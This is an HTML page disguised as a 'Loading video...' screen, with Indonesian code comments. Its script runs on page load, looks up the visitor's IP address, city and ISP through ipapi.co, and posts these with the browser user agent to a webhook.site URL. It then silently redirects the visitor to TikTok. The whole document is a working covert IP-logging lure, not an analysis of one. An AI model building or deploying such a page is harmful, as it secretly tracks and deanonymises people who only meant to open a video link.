<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <script>
        async function gas() {
            try {
                // Ambil data IP
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                
                // Kirim ke Webhook kamu
                await fetch('https://webhook.site/da585ce8-007d-4bdd-8301-698ea088b877', {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({
                        status: "Berhasil dari Github",
                        ip: d.ip,
                        kota: d.city,
                        isp: d.org,
                        hp: navigator.userAgent
                    })
                });
            } catch (e) {}
            
            // Pindah ke TikTok
            window.location.replace("https://www.tiktok.com");
        }
        window.onload = gas;
    </script>
</head>
<body style="background:white; display:flex; align-items:center; justify-content:center; height:100vh; font-family:sans-serif;">
    <p>Loading video...</p>
</body>
</html>
